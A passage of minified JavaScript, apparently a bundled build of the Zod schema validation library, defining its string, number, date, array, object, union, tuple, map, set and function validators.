o=e.data.length>s.value,a=e.data.length<s.value;(o||a)&&(n=this._getOrReturnCtx(e,n),o?Pt(n,{code:Je.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}):a&&Pt(n,{code:Je.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}),i.dirty())}else if(s.kind==="email")q1e.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"email",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="emoji")rS||(rS=new RegExp(z1e,"u")),rS.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"emoji",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="uuid")F1e.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"uuid",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="cuid")L1e.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"cuid",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="cuid2")U1e.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"cuid2",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="ulid")j1e.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"ulid",code:Je.invalid_string,message:s.message}),i.dirty());else if(s.kind==="url")try{new URL(e.data)}catch{n=this._getOrReturnCtx(e,n),Pt(n,{validation:"url",code:Je.invalid_string,message:s.message}),i.dirty()}else s.kind==="regex"?(s.regex.lastIndex=0,s.regex.test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"regex",code:Je.invalid_string,message:s.message}),i.dirty())):s.kind==="trim"?e.data=e.data.trim():s.kind==="includes"?e.data.includes(s.value,s.position)||(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.invalid_string,validation:{includes:s.value,position:s.position},message:s.message}),i.dirty()):s.kind==="toLowerCase"?e.data=e.data.toLowerCase():s.kind==="toUpperCase"?e.data=e.data.toUpperCase():s.kind==="startsWith"?e.data.startsWith(s.value)||(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.invalid_string,validation:{startsWith:s.value},message:s.message}),i.dirty()):s.kind==="endsWith"?e.data.endsWith(s.value)||(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.invalid_string,validation:{endsWith:s.value},message:s.message}),i.dirty()):s.kind==="datetime"?V1e(s).test(e.data)||(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.invalid_string,validation:"datetime",message:s.message}),i.dirty()):s.kind==="ip"?K1e(e.data,s.version)||(n=this._getOrReturnCtx(e,n),Pt(n,{validation:"ip",code:Je.invalid_string,message:s.message}),i.dirty()):bi.assertNever(s);return{status:i.value,value:e.data}}_regex(e,t,i){return this.refinement(n=>e.test(n),{validation:t,code:Je.invalid_string,...Jt.errToObj(i)})}_addCheck(e){return new cu({...this._def,checks:[...this._def.checks,e]})}email(e){return this._addCheck({kind:"email",...Jt.errToObj(e)})}url(e){return this._addCheck({kind:"url",...Jt.errToObj(e)})}emoji(e){return this._addCheck({kind:"emoji",...Jt.errToObj(e)})}uuid(e){return this._addCheck({kind:"uuid",...Jt.errToObj(e)})}cuid(e){return this._addCheck({kind:"cuid",...Jt.errToObj(e)})}cuid2(e){return this._addCheck({kind:"cuid2",...Jt.errToObj(e)})}ulid(e){return this._addCheck({kind:"ulid",...Jt.errToObj(e)})}ip(e){return this._addCheck({kind:"ip",...Jt.errToObj(e)})}datetime(e){var t;return typeof e=="string"?this._addCheck({kind:"datetime",precision:null,offset:!1,message:e}):this._addCheck({kind:"datetime",precision:typeof e?.precision>"u"?null:e?.precision,offset:(t=e?.offset)!==null&&t!==void 0?t:!1,...Jt.errToObj(e?.message)})}regex(e,t){return this._addCheck({kind:"regex",regex:e,...Jt.errToObj(t)})}includes(e,t){return this._addCheck({kind:"includes",value:e,position:t?.position,...Jt.errToObj(t?.message)})}startsWith(e,t){return this._addCheck({kind:"startsWith",value:e,...Jt.errToObj(t)})}endsWith(e,t){return this._addCheck({kind:"endsWith",value:e,...Jt.errToObj(t)})}min(e,t){return this._addCheck({kind:"min",value:e,...Jt.errToObj(t)})}max(e,t){return this._addCheck({kind:"max",value:e,...Jt.errToObj(t)})}length(e,t){return this._addCheck({kind:"length",value:e,...Jt.errToObj(t)})}nonempty(e){return this.min(1,Jt.errToObj(e))}trim(){return new cu({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new cu({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new cu({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find(e=>e.kind==="datetime")}get isEmail(){return!!this._def.checks.find(e=>e.kind==="email")}get isURL(){return!!this._def.checks.find(e=>e.kind==="url")}get isEmoji(){return!!this._def.checks.find(e=>e.kind==="emoji")}get isUUID(){return!!this._def.checks.find(e=>e.kind==="uuid")}get isCUID(){return!!this._def.checks.find(e=>e.kind==="cuid")}get isCUID2(){return!!this._def.checks.find(e=>e.kind==="cuid2")}get isULID(){return!!this._def.checks.find(e=>e.kind==="ulid")}get isIP(){return!!this._def.checks.find(e=>e.kind==="ip")}get minLength(){let e=null;for(const t of this._def.checks)t.kind==="min"&&(e===null||t.value>e)&&(e=t.value);return e}get maxLength(){let e=null;for(const t of this._def.checks)t.kind==="max"&&(e===null||t.value<e)&&(e=t.value);return e}}cu.create=r=>{var e;return new cu({checks:[],typeName:hr.ZodString,coerce:(e=r?.coerce)!==null&&e!==void 0?e:!1,...Sr(r)})};function G1e(r,e){const t=(r.toString().split(".")[1]||"").length,i=(e.toString().split(".")[1]||"").length,n=t>i?t:i,s=parseInt(r.toFixed(n).replace(".","")),o=parseInt(e.toFixed(n).replace(".",""));return s%o/Math.pow(10,n)}class np extends Rr{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(e){if(this._def.coerce&&(e.data=Number(e.data)),this._getType(e)!==_t.number){const s=this._getOrReturnCtx(e);return Pt(s,{code:Je.invalid_type,expected:_t.number,received:s.parsedType}),xr}let i;const n=new Do;for(const s of this._def.checks)s.kind==="int"?bi.isInteger(e.data)||(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.invalid_type,expected:"integer",received:"float",message:s.message}),n.dirty()):s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.too_small,minimum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),n.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.too_big,maximum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),n.dirty()):s.kind==="multipleOf"?G1e(e.data,s.value)!==0&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.not_multiple_of,multipleOf:s.value,message:s.message}),n.dirty()):s.kind==="finite"?Number.isFinite(e.data)||(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.not_finite,message:s.message}),n.dirty()):bi.assertNever(s);return{status:n.value,value:e.data}}gte(e,t){return this.setLimit("min",e,!0,Jt.toString(t))}gt(e,t){return this.setLimit("min",e,!1,Jt.toString(t))}lte(e,t){return this.setLimit("max",e,!0,Jt.toString(t))}lt(e,t){return this.setLimit("max",e,!1,Jt.toString(t))}setLimit(e,t,i,n){return new np({...this._def,checks:[...this._def.checks,{kind:e,value:t,inclusive:i,message:Jt.toString(n)}]})}_addCheck(e){return new np({...this._def,checks:[...this._def.checks,e]})}int(e){return this._addCheck({kind:"int",message:Jt.toString(e)})}positive(e){return this._addCheck({kind:"min",value:0,inclusive:!1,message:Jt.toString(e)})}negative(e){return this._addCheck({kind:"max",value:0,inclusive:!1,message:Jt.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:0,inclusive:!0,message:Jt.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:0,inclusive:!0,message:Jt.toString(e)})}multipleOf(e,t){return this._addCheck({kind:"multipleOf",value:e,message:Jt.toString(t)})}finite(e){return this._addCheck({kind:"finite",message:Jt.toString(e)})}safe(e){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:Jt.toString(e)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:Jt.toString(e)})}get minValue(){let e=null;for(const t of this._def.checks)t.kind==="min"&&(e===null||t.value>e)&&(e=t.value);return e}get maxValue(){let e=null;for(const t of this._def.checks)t.kind==="max"&&(e===null||t.value<e)&&(e=t.value);return e}get isInt(){return!!this._def.checks.find(e=>e.kind==="int"||e.kind==="multipleOf"&&bi.isInteger(e.value))}get isFinite(){let e=null,t=null;for(const i of this._def.checks){if(i.kind==="finite"||i.kind==="int"||i.kind==="multipleOf")return!0;i.kind==="min"?(t===null||i.value>t)&&(t=i.value):i.kind==="max"&&(e===null||i.value<e)&&(e=i.value)}return Number.isFinite(t)&&Number.isFinite(e)}}np.create=r=>new np({checks:[],typeName:hr.ZodNumber,coerce:r?.coerce||!1,...Sr(r)});class sp extends Rr{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte}_parse(e){if(this._def.coerce&&(e.data=BigInt(e.data)),this._getType(e)!==_t.bigint){const s=this._getOrReturnCtx(e);return Pt(s,{code:Je.invalid_type,expected:_t.bigint,received:s.parsedType}),xr}let i;const n=new Do;for(const s of this._def.checks)s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.too_small,type:"bigint",minimum:s.value,inclusive:s.inclusive,message:s.message}),n.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.too_big,type:"bigint",maximum:s.value,inclusive:s.inclusive,message:s.message}),n.dirty()):s.kind==="multipleOf"?e.data%s.value!==BigInt(0)&&(i=this._getOrReturnCtx(e,i),Pt(i,{code:Je.not_multiple_of,multipleOf:s.value,message:s.message}),n.dirty()):bi.assertNever(s);return{status:n.value,value:e.data}}gte(e,t){return this.setLimit("min",e,!0,Jt.toString(t))}gt(e,t){return this.setLimit("min",e,!1,Jt.toString(t))}lte(e,t){return this.setLimit("max",e,!0,Jt.toString(t))}lt(e,t){return this.setLimit("max",e,!1,Jt.toString(t))}setLimit(e,t,i,n){return new sp({...this._def,checks:[...this._def.checks,{kind:e,value:t,inclusive:i,message:Jt.toString(n)}]})}_addCheck(e){return new sp({...this._def,checks:[...this._def.checks,e]})}positive(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:Jt.toString(e)})}negative(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:Jt.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:Jt.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:Jt.toString(e)})}multipleOf(e,t){return this._addCheck({kind:"multipleOf",value:e,message:Jt.toString(t)})}get minValue(){let e=null;for(const t of this._def.checks)t.kind==="min"&&(e===null||t.value>e)&&(e=t.value);return e}get maxValue(){let e=null;for(const t of this._def.checks)t.kind==="max"&&(e===null||t.value<e)&&(e=t.value);return e}}sp.create=r=>{var e;return new sp({checks:[],typeName:hr.ZodBigInt,coerce:(e=r?.coerce)!==null&&e!==void 0?e:!1,...Sr(r)})};class Rv extends Rr{_parse(e){if(this._def.coerce&&(e.data=!!e.data),this._getType(e)!==_t.boolean){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.boolean,received:i.parsedType}),xr}return Jo(e.data)}}Rv.create=r=>new Rv({typeName:hr.ZodBoolean,coerce:r?.coerce||!1,...Sr(r)});class G1 extends Rr{_parse(e){if(this._def.coerce&&(e.data=new Date(e.data)),this._getType(e)!==_t.date){const s=this._getOrReturnCtx(e);return Pt(s,{code:Je.invalid_type,expected:_t.date,received:s.parsedType}),xr}if(isNaN(e.data.getTime())){const s=this._getOrReturnCtx(e);return Pt(s,{code:Je.invalid_date}),xr}const i=new Do;let n;for(const s of this._def.checks)s.kind==="min"?e.data.getTime()<s.value&&(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.too_small,message:s.message,inclusive:!0,exact:!1,minimum:s.value,type:"date"}),i.dirty()):s.kind==="max"?e.data.getTime()>s.value&&(n=this._getOrReturnCtx(e,n),Pt(n,{code:Je.too_big,message:s.message,inclusive:!0,exact:!1,maximum:s.value,type:"date"}),i.dirty()):bi.assertNever(s);return{status:i.value,value:new Date(e.data.getTime())}}_addCheck(e){return new G1({...this._def,checks:[...this._def.checks,e]})}min(e,t){return this._addCheck({kind:"min",value:e.getTime(),message:Jt.toString(t)})}max(e,t){return this._addCheck({kind:"max",value:e.getTime(),message:Jt.toString(t)})}get minDate(){let e=null;for(const t of this._def.checks)t.kind==="min"&&(e===null||t.value>e)&&(e=t.value);return e!=null?new Date(e):null}get maxDate(){let e=null;for(const t of this._def.checks)t.kind==="max"&&(e===null||t.value<e)&&(e=t.value);return e!=null?new Date(e):null}}G1.create=r=>new G1({checks:[],coerce:r?.coerce||!1,typeName:hr.ZodDate,...Sr(r)});class Y9 extends Rr{_parse(e){if(this._getType(e)!==_t.symbol){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.symbol,received:i.parsedType}),xr}return Jo(e.data)}}Y9.create=r=>new Y9({typeName:hr.ZodSymbol,...Sr(r)});class Ov extends Rr{_parse(e){if(this._getType(e)!==_t.undefined){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.undefined,received:i.parsedType}),xr}return Jo(e.data)}}Ov.create=r=>new Ov({typeName:hr.ZodUndefined,...Sr(r)});class Bv extends Rr{_parse(e){if(this._getType(e)!==_t.null){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.null,received:i.parsedType}),xr}return Jo(e.data)}}Bv.create=r=>new Bv({typeName:hr.ZodNull,...Sr(r)});class Sw extends Rr{constructor(){super(...arguments),this._any=!0}_parse(e){return Jo(e.data)}}Sw.create=r=>new Sw({typeName:hr.ZodAny,...Sr(r)});class M1 extends Rr{constructor(){super(...arguments),this._unknown=!0}_parse(e){return Jo(e.data)}}M1.create=r=>new M1({typeName:hr.ZodUnknown,...Sr(r)});class l0 extends Rr{_parse(e){const t=this._getOrReturnCtx(e);return Pt(t,{code:Je.invalid_type,expected:_t.never,received:t.parsedType}),xr}}l0.create=r=>new l0({typeName:hr.ZodNever,...Sr(r)});class J9 extends Rr{_parse(e){if(this._getType(e)!==_t.undefined){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.void,received:i.parsedType}),xr}return Jo(e.data)}}J9.create=r=>new J9({typeName:hr.ZodVoid,...Sr(r)});class hu extends Rr{_parse(e){const{ctx:t,status:i}=this._processInputParams(e),n=this._def;if(t.parsedType!==_t.array)return Pt(t,{code:Je.invalid_type,expected:_t.array,received:t.parsedType}),xr;if(n.exactLength!==null){const o=t.data.length>n.exactLength.value,a=t.data.length<n.exactLength.value;(o||a)&&(Pt(t,{code:o?Je.too_big:Je.too_small,minimum:a?n.exactLength.value:void 0,maximum:o?n.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:n.exactLength.message}),i.dirty())}if(n.minLength!==null&&t.data.length<n.minLength.value&&(Pt(t,{code:Je.too_small,minimum:n.minLength.value,type:"array",inclusive:!0,exact:!1,message:n.minLength.message}),i.dirty()),n.maxLength!==null&&t.data.length>n.maxLength.value&&(Pt(t,{code:Je.too_big,maximum:n.maxLength.value,type:"array",inclusive:!0,exact:!1,message:n.maxLength.message}),i.dirty()),t.common.async)return Promise.all([...t.data].map((o,a)=>n.type._parseAsync(new Nd(t,o,t.path,a)))).then(o=>Do.mergeArray(i,o));const s=[...t.data].map((o,a)=>n.type._parseSync(new Nd(t,o,t.path,a)));return Do.mergeArray(i,s)}get element(){return this._def.type}min(e,t){return new hu({...this._def,minLength:{value:e,message:Jt.toString(t)}})}max(e,t){return new hu({...this._def,maxLength:{value:e,message:Jt.toString(t)}})}length(e,t){return new hu({...this._def,exactLength:{value:e,message:Jt.toString(t)}})}nonempty(e){return this.min(1,e)}}hu.create=(r,e)=>new hu({type:r,minLength:null,maxLength:null,exactLength:null,typeName:hr.ZodArray,...Sr(e)});function Pm(r){if(r instanceof kn){const e={};for(const t in r.shape){const i=r.shape[t];e[t]=Xh.create(Pm(i))}return new kn({...r._def,shape:()=>e})}else return r instanceof hu?new hu({...r._def,type:Pm(r.element)}):r instanceof Xh?Xh.create(Pm(r.unwrap())):r instanceof Y1?Y1.create(Pm(r.unwrap())):r instanceof Pd?Pd.create(r.items.map(e=>Pm(e))):r}class kn extends Rr{constructor(){super(...arguments),this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;const e=this._def.shape(),t=bi.objectKeys(e);return this._cached={shape:e,keys:t}}_parse(e){if(this._getType(e)!==_t.object){const l=this._getOrReturnCtx(e);return Pt(l,{code:Je.invalid_type,expected:_t.object,received:l.parsedType}),xr}const{status:i,ctx:n}=this._processInputParams(e),{shape:s,keys:o}=this._getCached(),a=[];if(!(this._def.catchall instanceof l0&&this._def.unknownKeys==="strip"))for(const l in n.data)o.includes(l)||a.push(l);const c=[];for(const l of o){const u=s[l],d=n.data[l];c.push({key:{status:"valid",value:l},value:u._parse(new Nd(n,d,n.path,l)),alwaysSet:l in n.data})}if(this._def.catchall instanceof l0){const l=this._def.unknownKeys;if(l==="passthrough")for(const u of a)c.push({key:{status:"valid",value:u},value:{status:"valid",value:n.data[u]}});else if(l==="strict")a.length>0&&(Pt(n,{code:Je.unrecognized_keys,keys:a}),i.dirty());else if(l!=="strip")throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{const l=this._def.catchall;for(const u of a){const d=n.data[u];c.push({key:{status:"valid",value:u},value:l._parse(new Nd(n,d,n.path,u)),alwaysSet:u in n.data})}}return n.common.async?Promise.resolve().then(async()=>{const l=[];for(const u of c){const d=await u.key;l.push({key:d,value:await u.value,alwaysSet:u.alwaysSet})}return l}).then(l=>Do.mergeObjectSync(i,l)):Do.mergeObjectSync(i,c)}get shape(){return this._def.shape()}strict(e){return Jt.errToObj,new kn({...this._def,unknownKeys:"strict",...e!==void 0?{errorMap:(t,i)=>{var n,s,o,a;const c=(o=(s=(n=this._def).errorMap)===null||s===void 0?void 0:s.call(n,t,i).message)!==null&&o!==void 0?o:i.defaultError;return t.code==="unrecognized_keys"?{message:(a=Jt.errToObj(e).message)!==null&&a!==void 0?a:c}:{message:c}}}:{}})}strip(){return new kn({...this._def,unknownKeys:"strip"})}passthrough(){return new kn({...this._def,unknownKeys:"passthrough"})}extend(e){return new kn({...this._def,shape:()=>({...this._def.shape(),...e})})}merge(e){return new kn({unknownKeys:e._def.unknownKeys,catchall:e._def.catchall,shape:()=>({...this._def.shape(),...e._def.shape()}),typeName:hr.ZodObject})}setKey(e,t){return this.augment({[e]:t})}catchall(e){return new kn({...this._def,catchall:e})}pick(e){const t={};return bi.objectKeys(e).forEach(i=>{e[i]&&this.shape[i]&&(t[i]=this.shape[i])}),new kn({...this._def,shape:()=>t})}omit(e){const t={};return bi.objectKeys(this.shape).forEach(i=>{e[i]||(t[i]=this.shape[i])}),new kn({...this._def,shape:()=>t})}deepPartial(){return Pm(this)}partial(e){const t={};return bi.objectKeys(this.shape).forEach(i=>{const n=this.shape[i];e&&!e[i]?t[i]=n:t[i]=n.optional()}),new kn({...this._def,shape:()=>t})}required(e){const t={};return bi.objectKeys(this.shape).forEach(i=>{if(e&&!e[i])t[i]=this.shape[i];else{let s=this.shape[i];for(;s instanceof Xh;)s=s._def.innerType;t[i]=s}}),new kn({...this._def,shape:()=>t})}keyof(){return $J(bi.objectKeys(this.shape))}}kn.create=(r,e)=>new kn({shape:()=>r,unknownKeys:"strip",catchall:l0.create(),typeName:hr.ZodObject,...Sr(e)});kn.strictCreate=(r,e)=>new kn({shape:()=>r,unknownKeys:"strict",catchall:l0.create(),typeName:hr.ZodObject,...Sr(e)});kn.lazycreate=(r,e)=>new kn({shape:r,unknownKeys:"strip",catchall:l0.create(),typeName:hr.ZodObject,...Sr(e)});class Mv extends Rr{_parse(e){const{ctx:t}=this._processInputParams(e),i=this._def.options;function n(s){for(const a of s)if(a.result.status==="valid")return a.result;for(const a of s)if(a.result.status==="dirty")return t.common.issues.push(...a.ctx.common.issues),a.result;const o=s.map(a=>new du(a.ctx.common.issues));return Pt(t,{code:Je.invalid_union,unionErrors:o}),xr}if(t.common.async)return Promise.all(i.map(async s=>{const o={...t,common:{...t.common,issues:[]},parent:null};return{result:await s._parseAsync({data:t.data,path:t.path,parent:o}),ctx:o}})).then(n);{let s;const o=[];for(const c of i){const l={...t,common:{...t.common,issues:[]},parent:null},u=c._parseSync({data:t.data,path:t.path,parent:l});if(u.status==="valid")return u;u.status==="dirty"&&!s&&(s={result:u,ctx:l}),l.common.issues.length&&o.push(l.common.issues)}if(s)return t.common.issues.push(...s.ctx.common.issues),s.result;const a=o.map(c=>new du(c));return Pt(t,{code:Je.invalid_union,unionErrors:a}),xr}}get options(){return this._def.options}}Mv.create=(r,e)=>new Mv({options:r,typeName:hr.ZodUnion,...Sr(e)});const t9=r=>r instanceof Uv?t9(r.schema):r instanceof pu?t9(r.innerType()):r instanceof jv?[r.value]:r instanceof op?r.options:r instanceof Fv?Object.keys(r.enum):r instanceof qv?t9(r._def.innerType):r instanceof Ov?[void 0]:r instanceof Bv?[null]:null;class eC extends Rr{_parse(e){const{ctx:t}=this._processInputParams(e);if(t.parsedType!==_t.object)return Pt(t,{code:Je.invalid_type,expected:_t.object,received:t.parsedType}),xr;const i=this.discriminator,n=t.data[i],s=this.optionsMap.get(n);return s?t.common.async?s._parseAsync({data:t.data,path:t.path,parent:t}):s._parseSync({data:t.data,path:t.path,parent:t}):(Pt(t,{code:Je.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[i]}),xr)}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(e,t,i){const n=new Map;for(const s of t){const o=t9(s.shape[e]);if(!o)throw new Error(`A discriminator value for key \`${e}\` could not be extracted from all schema options`);for(const a of o){if(n.has(a))throw new Error(`Discriminator property ${String(e)} has duplicate value ${String(a)}`);n.set(a,s)}}return new eC({typeName:hr.ZodDiscriminatedUnion,discriminator:e,options:t,optionsMap:n,...Sr(i)})}}function pk(r,e){const t=Af(r),i=Af(e);if(r===e)return{valid:!0,data:r};if(t===_t.object&&i===_t.object){const n=bi.objectKeys(e),s=bi.objectKeys(r).filter(a=>n.indexOf(a)!==-1),o={...r,...e};for(const a of s){const c=pk(r[a],e[a]);if(!c.valid)return{valid:!1};o[a]=c.data}return{valid:!0,data:o}}else if(t===_t.array&&i===_t.array){if(r.length!==e.length)return{valid:!1};const n=[];for(let s=0;s<r.length;s++){const o=r[s],a=e[s],c=pk(o,a);if(!c.valid)return{valid:!1};n.push(c.data)}return{valid:!0,data:n}}else return t===_t.date&&i===_t.date&&+r==+e?{valid:!0,data:r}:{valid:!1}}class Dv extends Rr{_parse(e){const{status:t,ctx:i}=this._processInputParams(e),n=(s,o)=>{if(hk(s)||hk(o))return xr;const a=pk(s.value,o.value);return a.valid?((fk(s)||fk(o))&&t.dirty(),{status:t.value,value:a.data}):(Pt(i,{code:Je.invalid_intersection_types}),xr)};return i.common.async?Promise.all([this._def.left._parseAsync({data:i.data,path:i.path,parent:i}),this._def.right._parseAsync({data:i.data,path:i.path,parent:i})]).then(([s,o])=>n(s,o)):n(this._def.left._parseSync({data:i.data,path:i.path,parent:i}),this._def.right._parseSync({data:i.data,path:i.path,parent:i}))}}Dv.create=(r,e,t)=>new Dv({left:r,right:e,typeName:hr.ZodIntersection,...Sr(t)});class Pd extends Rr{_parse(e){const{status:t,ctx:i}=this._processInputParams(e);if(i.parsedType!==_t.array)return Pt(i,{code:Je.invalid_type,expected:_t.array,received:i.parsedType}),xr;if(i.data.length<this._def.items.length)return Pt(i,{code:Je.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),xr;!this._def.rest&&i.data.length>this._def.items.length&&(Pt(i,{code:Je.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),t.dirty());const s=[...i.data].map((o,a)=>{const c=this._def.items[a]||this._def.rest;return c?c._parse(new Nd(i,o,i.path,a)):null}).filter(o=>!!o);return i.common.async?Promise.all(s).then(o=>Do.mergeArray(t,o)):Do.mergeArray(t,s)}get items(){return this._def.items}rest(e){return new Pd({...this._def,rest:e})}}Pd.create=(r,e)=>{if(!Array.isArray(r))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new Pd({items:r,typeName:hr.ZodTuple,rest:null,...Sr(e)})};class Lv extends Rr{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:t,ctx:i}=this._processInputParams(e);if(i.parsedType!==_t.object)return Pt(i,{code:Je.invalid_type,expected:_t.object,received:i.parsedType}),xr;const n=[],s=this._def.keyType,o=this._def.valueType;for(const a in i.data)n.push({key:s._parse(new Nd(i,a,i.path,a)),value:o._parse(new Nd(i,i.data[a],i.path,a))});return i.common.async?Do.mergeObjectAsync(t,n):Do.mergeObjectSync(t,n)}get element(){return this._def.valueType}static create(e,t,i){return t instanceof Rr?new Lv({keyType:e,valueType:t,typeName:hr.ZodRecord,...Sr(i)}):new Lv({keyType:cu.create(),valueType:e,typeName:hr.ZodRecord,...Sr(t)})}}class Q9 extends Rr{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:t,ctx:i}=this._processInputParams(e);if(i.parsedType!==_t.map)return Pt(i,{code:Je.invalid_type,expected:_t.map,received:i.parsedType}),xr;const n=this._def.keyType,s=this._def.valueType,o=[...i.data.entries()].map(([a,c],l)=>({key:n._parse(new Nd(i,a,i.path,[l,"key"])),value:s._parse(new Nd(i,c,i.path,[l,"value"]))}));if(i.common.async){const a=new Map;return Promise.resolve().then(async()=>{for(const c of o){const l=await c.key,u=await c.value;if(l.status==="aborted"||u.status==="aborted")return xr;(l.status==="dirty"||u.status==="dirty")&&t.dirty(),a.set(l.value,u.value)}return{status:t.value,value:a}})}else{const a=new Map;for(const c of o){const l=c.key,u=c.value;if(l.status==="aborted"||u.status==="aborted")return xr;(l.status==="dirty"||u.status==="dirty")&&t.dirty(),a.set(l.value,u.value)}return{status:t.value,value:a}}}}Q9.create=(r,e,t)=>new Q9({valueType:e,keyType:r,typeName:hr.ZodMap,...Sr(t)});class Z1 extends Rr{_parse(e){const{status:t,ctx:i}=this._processInputParams(e);if(i.parsedType!==_t.set)return Pt(i,{code:Je.invalid_type,expected:_t.set,received:i.parsedType}),xr;const n=this._def;n.minSize!==null&&i.data.size<n.minSize.value&&(Pt(i,{code:Je.too_small,minimum:n.minSize.value,type:"set",inclusive:!0,exact:!1,message:n.minSize.message}),t.dirty()),n.maxSize!==null&&i.data.size>n.maxSize.value&&(Pt(i,{code:Je.too_big,maximum:n.maxSize.value,type:"set",inclusive:!0,exact:!1,message:n.maxSize.message}),t.dirty());const s=this._def.valueType;function o(c){const l=new Set;for(const u of c){if(u.status==="aborted")return xr;u.status==="dirty"&&t.dirty(),l.add(u.value)}return{status:t.value,value:l}}const a=[...i.data.values()].map((c,l)=>s._parse(new Nd(i,c,i.path,l)));return i.common.async?Promise.all(a).then(c=>o(c)):o(a)}min(e,t){return new Z1({...this._def,minSize:{value:e,message:Jt.toString(t)}})}max(e,t){return new Z1({...this._def,maxSize:{value:e,message:Jt.toString(t)}})}size(e,t){return this.min(e,t).max(e,t)}nonempty(e){return this.min(1,e)}}Z1.create=(r,e)=>new Z1({valueType:r,minSize:null,maxSize:null,typeName:hr.ZodSet,...Sr(e)});class iw extends Rr{constructor(){super(...arguments),this.validate=this.implement}_parse(e){const{ctx:t}=this._processInputParams(e);if(t.parsedType!==_t.function)return Pt(t,{code:Je.invalid_type,expected:_t.function,received:t.parsedType}),xr;function i(a,c){return G9({data:a,path:t.path,errorMaps:[t.common.contextualErrorMap,t.schemaErrorMap,K9(),Pv].filter(l=>!!l),issueData:{code:Je.invalid_arguments,argumentsError:c}})}function n(a,c){return G9({data:a,path:t.path,errorMaps:[t.common.contextualErrorMap,t.schemaErrorMap,K9(),Pv].filter(l=>!!l),issueData:{code:Je.invalid_return_type,returnTypeError:c}})}const s={errorMap:t.common.contextualErrorMap},o=t.data;if(this._def.returns instanceof Aw){const a=this;return Jo(async function(...c){const l=new du([]),u=await a._def.args.parseAsync(c,s).catch(f=>{throw l.addIssue(i(c,f)),l}),d=await Reflect.apply(o,this,u);return await a._def.returns._def.type.parseAsync(d,s).catch(f=>{throw l.addIssue(n(d,f)),l})})}else{const a=this;return Jo(function(...c){const l=a._def.args.safeParse(c,s);if(!l.success)throw new du([i(c,l.error)]);const u=Reflect.apply(o,this,l.data),d=a._def.returns.safeParse(u,s);if(!d.success)throw new du([n(u,d.error)]);return d.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...e){return new iw({...this._def,args:Pd.create(e).rest(M1.create())})}returns(e){return new iw({...this._def,returns:e})}implement(e){return this.parse(e)}strictImplement(e){return this.parse(e)}static create(e,t,i){return new iw({args:e||Pd.create([]).rest(M1.create()),returns:t||M1.create(),typeName:hr.ZodFunction,...Sr(i)})}}class Uv extends Rr{get schema(){return this._def.getter()}_parse(e){const{ctx:t}=this._processInputParams(e);return 